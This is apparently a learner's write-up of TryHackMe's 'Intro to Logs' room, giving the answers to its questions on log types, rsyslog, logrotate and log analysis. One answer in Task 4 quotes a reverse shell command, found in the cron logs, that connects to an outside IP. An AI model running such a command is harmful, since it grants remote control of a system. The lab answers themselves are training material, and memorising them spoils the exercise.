# TryHackMe — Intro to Logs

## Lab Info
- **Platform:** TryHackMe
- **Room Name:** Intro to Logs
- **Difficulty:** Easy
- **Time to Complete:** ~30 minutes
- **Date Completed:** 2026-11-05

## Objective
- Understand the importance of logs as a historical record for identifying and mitigating potential threats.
- Explore various types of logs, logging mechanisms, and collection methods across multiple platforms.
- Gain hands-on experience detecting and defeating adversaries through log analysis.

---

## Task Writeups & Answers

### Task 1: Introduction
- **Overview:** This task introduces the concept of logs as records of past events. By analyzing them, we can identify malicious activities, understand breaches, and establish a reliable source of historical evidence.
- **Answer:** No answer needed.

### Task 2: Expanding Perspectives: Logs as Evidence of Historical Activity
- **Overview:** Focused on how logs tell a story. A single log entry may not mean much, but aggregated and correlated, it answers critical questions: What happened? When? Where? Who? Were they successful? What was the result? We connected to a lab VM via SSH.
- **Questions & Answers:**
  - **What is the name of your colleague who left a note on your Desktop?**
    - **Answer:** `Perry`
  - **What is the full path to the suggested log file for initial investigation?**
    - **Answer:** `/var/log/gitlab/nginx/access.log`

### Task 3: Types, Formats, and Standards
- **Overview:** Logs come in different types (Application, Audit, Security, Server, System, Network, Database, Web Server) and formats (Semi-structured like Syslog/EVTX, Structured like CSV/JSON/XML, Unstructured like CLF). Log standards (like CEE, Syslog Protocol) help define how logs should be generated and stored.
- **Questions & Answers:**
  - **Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?**
    - **Answer:** `Web Server Log`
  - **Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?**
    - **Answer:** `Combined`

### Task 4: Collection, Management, and Centralisation
- **Overview:** Explored log collection from various sources and the importance of time synchronization (using NTP). We also learned how to centralize logs using `rsyslog` to send specific logs (like SSH) to a dedicated file.
- **Questions & Answers:**
  - **After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at `/var/log/websrv-02/rsyslog_sshd.log`, indicating failed login attempts or brute forcing?**
    - **Answer:** `stansimon`
  - **What is the IP address of SIEM-02 based on the rsyslog configuration file `/etc/rsyslog.d/99-websrv-02-cron.conf`, which is used to monitor cron messages?**
    - **Answer:** `10.10.10.101`
  - **Based on the generated logs in `/var/log/websrv-02/rsyslog_cron.log`, what command is being executed by the root user?**
    - **Answer:** `/bin/bash -c "{/bin/bash,-i} >& /dev/tcp/34.253.159.159/9999 0>&1"`

### Task 5: Storage, Retention, and Deletion
- **Overview:** Discussed how to store logs securely, the concept of Hot, Warm, and Cold storage for retention, and how to safely delete old logs. We also used `logrotate` to automate log rotation, compression, and deletion.
- **Questions & Answers:**
  - **Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, how many versions of old compressed log file copies will be kept?**
    - **Answer:** `24`
  - **Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, what is the log rotation frequency?**
    - **Answer:** `hourly`

### Task 6: Hands-on Exercise: Log analysis process, tools, and techniques
- **Overview:** Explored the log analysis process (Parsing, Normalization, Sorting, Classification, Enrichment, Correlation, Visualisation, Reporting). We used a web-based "Log Viewer" tool to inspect raw and parsed logs. We also used Linux commands like `awk`, `grep`, `sort`, and `uniq` to parse and consolidate logs manually.
- **Questions & Answers:**
  - **Upon accessing the log viewer URL for unparsed raw log files, what error does "`/var/log/websrv-02/rsyslog_cron.log`" show when selecting the different filters?**
    - **Answer:** `No date field`
  - **What is the process of standardising parsed data into a more easily readable and query-able form?**
    - **Answer:** `Normalisation`
  - **What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?**
    - **Answer:** `Enrichment`

### Task 7: Conclusion
- **Overview:** Wrapped up the room by summarizing the importance of logs, different formats, and analysis techniques. Introduced next steps like EDR, IDS/IPS, and SIEM.
- **Answer:** No answer needed.

---

## Key Takeaways
- **Logs tell a story:** Individually they are just data points, but when correlated, they reveal a complete timeline of an attack.
- **Time Synchronization is crucial:** NTP ensures that logs from different systems have aligned timestamps, which is vital for investigations.
- **Log formats vary:** You will encounter JSON, CSV, Syslog, and custom formats. Understanding how to parse them is a core SOC skill.
- **Log Rotation (logrotate) prevents disk exhaustion:** It's important to configure how long logs are kept and how they are compressed.
- **The Analysis Process:** Parsing → Normalisation → Sorting → Classification → Enrichment → Correlation → Visualisation → Reporting.

## Commands / Tools Used
```bash
# Time synchronization
ntpdate pool.ntp.org
date

# Rsyslog Configuration check
sudo systemctl status rsyslog
sudo systemctl restart rsyslog

# Log rotation (manual execution)
sudo logrotate -f /etc/logrotate.d/99-websrv-02_sshd.conf

# Parsing and Normalizing logs using awk, sort, uniq
awk -F'[][]' '{print "$2 $0"}' /var/log/gitlab/nginx/access.log | sed 's/ +0000//'
sort /tmp/parsed_consolidated.log > /tmp/sorted_consolidated.log
uniq /tmp/sorted_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log